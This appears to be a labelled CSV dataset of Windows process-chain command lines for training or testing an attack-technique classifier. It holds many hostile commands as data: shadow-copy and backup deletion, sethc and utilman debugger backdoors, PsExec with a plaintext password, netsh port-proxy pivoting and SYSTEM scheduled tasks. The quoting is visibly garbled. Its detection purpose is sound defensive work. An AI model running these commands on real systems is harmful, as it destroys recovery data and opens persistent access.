"text","labels"
"(C:\\\\Windows\\\\System32\\\\winlogon.exe) -> (C:\\\\Windows\\\\System32\\\\AtBroker.exe atbroker.exe'.strip())","""14"""
"(C:\\\\Windows\\\\explorer.exe) -> (C:\\\\Windows\\\\System32\\\\mmc.exe """"""""""""""""C:\\\\Windows\\\\system32\\\\mmc.exe"""""""""""""""" """"""""""""""""C:\\\\Windows\\\\system32\\\\eventvwr.msc"""""""""""""""" /s'.strip())","""17"""
"(C:\\\\Program Files\\\\Microsoft Monitoring Agent\\\\Agent\\\\MonitoringHost.exe) -> (C:\\\\Windows\\\\System32\\\\cscript.exe """"""""""""""""C:\\\\Windows\\\\system32\\\\cscript.exe"""""""""""""""" /nologo """"""""""""""""MonitorKnowledgeDiscovery.vbs""""""""""""""""'.strip())","""15;18"""
"(C:\\\\Program Files\\\\Microsoft Monitoring Agent\\\\Agent\\\\MonitoringHost.exe) -> (C:\\\\Windows\\\\System32\\\\cscript.exe """"""""""""""""C:\\\\Windows\\\\system32\\\\cscript.exe"""""""""""""""" /nologo """"""""""""""""MonitorKnowledgeDiscovery.vbs""""""""""""""""'.strip()) -> (C:\\\\Windows\\\\System32\\\\conhost.exe \\\\??\\\\C:\\\\Windows\\\\system32\\\\conhost.exe 0xffffffff -ForceV1'.strip())","""15;18"""
"(C:\\\\Windows\\\\System32\\\\net.exe net  share'.strip())","""21"""
"(C:\\\\Windows\\\\System32\\\\net.exe net  use m: \\\\\\\\fs03vuln\\\\c$ /USER:offsec\\\\hack1'.strip())","""21"""
"(C:\\\\Windows\\\\System32\\\\net1.exe C:\\\\Windows\\\\system32\\\\net1  share'.strip())","""21"""
"(C:\\\\Windows\\\\System32\\\\services.exe) -> (C:\\\\Windows\\\\PSEXESVC.exe C:\\\\Windows\\\\PSEXESVC.exe'.strip())","""21"""
"(C:\\\\Windows\\\\System32\\\\services.exe) -> (C:\\\\Windows\\\\PSEXESVC.exe C:\\\\Windows\\\\PSEXESVC.exe'.strip()) -> (C:\\\\Windows\\\\cmd.exe """"""""""""""""cmd.exe"""""""""""""""" -u demo\\\\admmig -p Admin1235 -accepteula '.strip())","""21;30"""
"(C:\\\\Windows\\\\System32\\\\services.exe) -> (C:\\\\Windows\\\\PSEXESVC.exe C:\\\\Windows\\\\PSEXESVC.exe'.strip()) -> (C:\\\\Windows\\\\cmd.exe """"""""""""""""cmd.exe"""""""""""""""" -u demo\\\\admmig -p Admin1235 -accepteula '.strip()) -> (C:\\\\Windows\\\\System32\\\\HOSTNAME.EXE hostname'.strip())","""21;30;2"""
"(C:\\\\Windows\\\\System32\\\\services.exe) -> (C:\\\\Windows\\\\PSEXESVC.exe C:\\\\Windows\\\\PSEXESVC.exe'.strip()) -> (C:\\\\Windows\\\\cmd.exe """"""""""""""""cmd.exe"""""""""""""""" -u demo\\\\admmig -p Admin1235 -accepteula '.strip()) -> (C:\\\\Windows\\\\System32\\\\conhost.exe \\\\??\\\\C:\\\\Windows\\\\system32\\\\conhost.exe 0xffffffff -ForceV1'.strip())","""21;30"""
"(C:\\\\Windows\\\\System32\\\\services.exe) -> (C:\\\\Windows\\\\PSEXESVC.exe C:\\\\Windows\\\\PSEXESVC.exe'.strip()) -> (C:\\\\Windows\\\\cmd.exe """"""""""""""""cmd.exe"""""""""""""""" -u demo\\\\admmig -p Admin1235 -accepteula '.strip()) -> (C:\\\\Windows\\\\System32\\\\whoami.exe whoami'.strip())","""21;25;30"""
"(C:\\\\Program Files\\\\Microsoft Monitoring Agent\\\\Agent\\\\MonitoringHost.exe) -> (C:\\\\Windows\\\\System32\\\\cscript.exe """"""""""""""""C:\\\\Windows\\\\system32\\\\cscript.exe"""""""""""""""" /nologo """"""""""""""""MonitorKnowledgeDiscovery.vbs""""""""""""""""'.strip())","""15"""
"(C:\\\\Program Files\\\\Microsoft Monitoring Agent\\\\Agent\\\\MonitoringHost.exe) -> (C:\\\\Windows\\\\System32\\\\cscript.exe """"""""""""""""C:\\\\Windows\\\\system32\\\\cscript.exe"""""""""""""""" /nologo """"""""""""""""MonitorKnowledgeDiscovery.vbs""""""""""""""""'.strip()) -> (C:\\\\Windows\\\\System32\\\\conhost.exe \\\\??\\\\C:\\\\Windows\\\\system32\\\\conhost.exe 0xffffffff -ForceV1'.strip())","""15"""
"(C:\\\\Windows\\\\System32\\\\cmd.exe cmd.exe'.strip())","""30"""
"(C:\\\\Windows\\\\System32\\\\conhost.exe \\\\??\\\\C:\\\\Windows\\\\system32\\\\conhost.exe 0xffffffff'.strip())","""30"""
"(C:\\\\Windows\\\\System32\\\\cmd.exe) -> (C:\\\\Windows\\\\System32\\\\netsh.exe netsh  I p a v l=8001 listena=0.0.0.0 connectp=3389 c=1.1.1.1'.strip())","""5"""
"(C:\\\\Windows\\\\System32\\\\cmd.exe) -> (C:\\\\Windows\\\\System32\\\\netsh.exe netsh  interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=48333 connectaddress=127.0.0.1 connectport=80'.strip())","""5"""
"(C:\\\\Windows\\\\System32\\\\cmd.exe) -> (C:\\\\Windows\\\\System32\\\\netsh.exe netsh  interface portproxy reset'.strip())","""5"""
"(C:\\\\Windows\\\\System32\\\\VSSVC.exe C:\\\\Windows\\\\system32\\\\vssvc.exe'.strip())","""0"""
"("C:\\Windows\\System32\\wbadmin.exe wbadmin delete systemstatebackup -keepVersions:0".strip())","0"
"("C:\\Windows\\System32\\wbadmin.exe wbadmin delete backup -keepVersions:1".strip())","0"
"("C:\\Windows\\System32\\wbadmin.exe wbadmin delete catalog -quiet".strip())","0"
"("C:\\Windows\\System32\\wbadmin.exe wbadmin delete backup -backupTarget:d:\\ -quiet".strip())","0"
"("C:\\Windows\\System32\\wbadmin.exe wbadmin delete backup -backupTarget:e:\\ -deleteOldest".strip())","0"
"(C:\\\\Windows\\\\System32\\\\wbadmin.exe wbadmin  delete backup -backupTarget:m:\\\\ -deleteOldest'.strip())","""0"""
"(C:\\\\Windows\\\\System32\\\\wbem\\\\WMIC.exe wmic  shadowcopy delete /nointeractive'.strip())","""0"""
"("C:\\Windows\\System32\\wbem\\WMIC.exe wmic shadowcopy delete".strip())","0"
"("C:\\Windows\\System32\\wbem\\WMIC.exe wmic shadowcopy delete /nointeractive".strip())","0"
"("C:\\Windows\\System32\\wbem\\WMIC.exe wmic shadowcopy call delete /nointeractive".strip())","0"
"("C:\\Windows\\System32\\wbem\\WMIC.exe wmic path Win32_ShadowCopy delete".strip())","0"
"("C:\\Windows\\System32\\wbem\\WMIC.exe wmic shadowcopy delete /all".strip())","0"
"("C:\\Windows\\System32\\vssadmin.exe vssadmin delete shadows /all /quiet".strip())","0"
"("C:\\Windows\\System32\\vssadmin.exe vssadmin delete shadows /for=c: /quiet".strip())","0"
"("C:\\Windows\\System32\\vssadmin.exe vssadmin resize shadowstorage /for=c: /on=c: /maxsize=300MB".strip())","0"
"("C:\\Windows\\System32\\vssadmin.exe vssadmin delete shadowstorage /for=d: /on=d: /quiet".strip())","0"
"("C:\\Windows\\System32\\vssadmin.exe vssadmin delete shadows /oldest".strip())","0"
"(C:\\\\Windows\\\\System32\\\\cmd.exe """"""""""""""""C:\\\\Windows\\\\System32\\\\cmd.exe""""""""""""""""'.strip())","""39"""
"(C:\\\\Windows\\\\System32\\\\cmd.exe /c whoami'.strip())","""39;25"""
"(C:\\\\Windows\\\\System32\\\\cmd.exe cmd.exe'.strip())","""39"""
"(C:\\\\Windows\\\\System32\\\\conhost.exe \\\\??\\\\C:\\\\Windows\\\\system32\\\\conhost.exe 0xffffffff'.strip())","""39"""
"(C:\\\\Windows\\\\System32\\\\ctfmon.exe ctfmon.exe'.strip())","""39"""
"(C:\\\\Windows\\\\System32\\\\runas.exe runas  /user:offsec\\\\hack1 cmd.exe '.strip())","""39"""
"(C:\\\\Windows\\\\System32\\\\whoami.exe whoami'.strip())","""25;39"""
"(C:\\\\Program Files\\\\Microsoft Monitoring Agent\\\\Agent\\\\MonitoringHost.exe) -> (C:\\\\Windows\\\\System32\\\\cscript.exe """"""""""""""""C:\\\\Windows\\\\system32\\\\cscript.exe"""""""""""""""" /nologo """"""""""""""""MonitorKnowledgeDiscovery.vbs""""""""""""""""'.strip())","""18"""
"(C:\\\\Program Files\\\\Microsoft Monitoring Agent\\\\Agent\\\\MonitoringHost.exe) -> (C:\\\\Windows\\\\System32\\\\cscript.exe """"""""""""""""C:\\\\Windows\\\\system32\\\\cscript.exe"""""""""""""""" /nologo """"""""""""""""MonitorKnowledgeDiscovery.vbs""""""""""""""""'.strip()) -> (C:\\\\Windows\\\\System32\\\\conhost.exe \\\\??\\\\C:\\\\Windows\\\\system32\\\\conhost.exe 0xffffffff -ForceV1'.strip())","""18"""
"(C:\\\\Windows\\\\System32\\\\cmd.exe) -> (C:\\\\Windows\\\\System32\\\\reg.exe REG  ADD """"""""""""""""HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\sethc.exe"""""""""""""""" /t REG_SZ /v Debugger /d """"""""""""""""C:\\\\windows\\\\system32\\\\cmd.exe"""""""""""""""" /f.strip())","""40"""
"("C:\\Windows\\System32\\cmd.exe) -> (C:\\Windows\\System32\\reg.exe REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\utilman.exe\" /v Debugger /t REG_SZ /d \"C:\\Windows\\System32\\cmd.exe\" /f")","40"
"("C:\\Windows\\System32\\cmd.exe) -> (C:\\Windows\\System32\\reg.exe REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\magnify.exe\" /v Debugger /t REG_SZ /d \"C:\\Windows\\System32\\cmd.exe\" /f")","40"
"("C:\\Windows\\System32\\cmd.exe) -> (C:\\Windows\\System32\\reg.exe REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\narrator.exe\" /v Debugger /t REG_SZ /d \"C:\\Windows\\System32\\cmd.exe\" /f")","40"
"("C:\\Windows\\System32\\cmd.exe) -> (C:\\Windows\\System32\\reg.exe REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\DisplaySwitch.exe\" /v Debugger /t REG_SZ /d \"C:\\Windows\\System32\\cmd.exe\" /f")","40"
"("C:\\Windows\\System32\\cmd.exe) -> (C:\\Windows\\System32\\reg.exe REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v Debugger /t REG_SZ /d \"C:\\Windows\\System32\\powershell.exe\" /f")","40"
"(C:\\\\Program Files\\\\Microsoft SQL Server\\\\MSSQL12.RADAR\\\\MSSQL\\\\Binn\\\\sqlservr.exe) -> (C:\\\\Windows\\\\System32\\\\cmd.exe """"""""""""""""C:\\\\Windows\\\\system32\\\\cmd.exe"""""""""""""""" /c echo Base64Chars = """"""""""""""""ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"""""""""""""""" >>%TEMP%\\\\UbdXv.vbs & echo If Len(strIn) = 0 Then >>%TEMP%\\\\UbdXv.vbs & echo mimedecode = -1 : Exit Function >>%TEMP%\\\\UbdXv.vbs & echo Else >>%TEMP%\\\\UbdXv.vbs & echo mimedecode = InStr(Base64Chars, strIn) - 1 >>%TEMP%\\\\UbdXv.vbs & echo End If >>%TEMP%\\\\UbdXv.vbs & echo End Function >>%TEMP%\\\\UbdXv.vbs & cscript //nologo %TEMP%\\\\UbdXv.vbs'.strip()) -> (C:\\\\Windows\\\\System32\\\\cscript.exe cscript  //nologo C:\\\\Users\\\\SVC-SQ~1\\\\AppData\\\\Local\\\\Temp\\\\UbdXv.vbs'.strip()) -> (C:\\\\Users\\\\SVC-SQ~1\\\\AppData\\\\Local\\\\Temp\\\\TVupu.exe """"""""""""""""C:\\\\Users\\\\SVC-SQ~1\\\\AppData\\\\Local\\\\Temp\\\\TVupu.exe"""""""""""""""" '.strip())","""30"""
(C:\\\\Windows\\\\System32\\\\cmd.exe cmd.exe /Q /c cd \\\\ 1> \\\\\\\\127.0.0.1\\\\ADMIN$\\\\__1619090610.0007844 2>&1'.strip())","""6;21"""
"(C:\\\\Windows\\\\System32\\\\conhost.exe \\\\??\\\\C:\\\\Windows\\\\system32\\\\conhost.exe 0xffffffff'.strip())","""6;21"""
"(C:\\\\Windows\\\\System32\\\\cmd.exe cmd.exe /Q /c cd  1> \\\\\\\\127.0.0.1\\\\ADMIN$\\\\__1619090610.0007844 2>&1'.strip())","""6;21"""
"(C:\\\\Windows\\\\System32\\\\cmd.exe) -> (C:\\\\Windows\\\\System32\\\\schtasks.exe schtasks  /create /s fs02 /tn tasks_test_hacker2 /tr myapp.exe /sc daily /mo 10'.strip())","""28"""
"(C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe) -> (C:\\\\Windows\\\\System32\\\\schtasks.exe """"""""""""""""C:\\\\Windows\\\\system32\\\\schtasks.exe"""""""""""""""" /create /sc minute /mo 1 /tn eviltask /tr C:\\\\tools\\\\shell.cmd /ru SYSTEM'.strip())","""7;28"""
"(C:\\\\Program Files\\\\Microsoft Monitoring Agent\\\\Agent\\\\MonitoringHost.exe) (C:\\\\Windows\\\\System32\\\\cscript.exe """"""""""""""""C:\\\\Windows\\\\system32\\\\cscript.exe"""""""""""""""" /nologo """"""""""""""""MonitorKnowledgeDiscovery.vbs""""""""""""""""'.strip())","""28"""
"(C:\\\\Program Files\\\\Microsoft Monitoring Agent\\\\Agent\\\\MonitoringHost.exe) (C:\\\\Windows\\\\System32\\\\cscript.exe """"""""""""""""C:\\\\Windows\\\\system32\\\\cscript.exe"""""""""""""""" /nologo """"""""""""""""MonitorKnowledgeDiscovery.vbs""""""""""""""""'.strip()) (C:\\\\Windows\\\\System32\\\\conhost.exe \\\\??\\\\C:\\\\Windows\\\\system32\\\\conhost.exe 0xffffffff -ForceV1'.strip())","""28"""
"(C:\\\\Windows\\\\System32\\\\cmd.exe) -> (C:\\\\Windows\\\\System32\\\\at.exe at  13:20 /interactive cmd'.strip())","""28"""
(C:\\\\Program Files\\\\Microsoft Monitoring Agent\\\\Agent\\\\MonitoringHost.exe) (C:\\\\Windows\\\\System32\\\\cscript.exe """"""""""""""""C:\\\\Windows\\\\system32\\\\cscript.exe"""""""""""""""" /nologo """"""""""""""""MonitorKnowledgeDiscovery.vbs""""""""""""""""'.strip())","""15"""
"(C:\\\\Program Files\\\\Microsoft Monitoring Agent\\\\Agent\\\\MonitoringHost.exe) (C:\\\\Windows\\\\System32\\\\cscript.exe """"""""""""""""C:\\\\Windows\\\\system32\\\\cscript.exe"""""""""""""""" /nologo """"""""""""""""MonitorKnowledgeDiscovery.vbs""""""""""""""""'.strip()) (C:\\\\Windows\\\\System32\\\\conhost.exe \\\\??\\\\C:\\\\Windows\\\\system32\\\\conhost.exe 0xffffffff -ForceV1'.strip())","""15"""
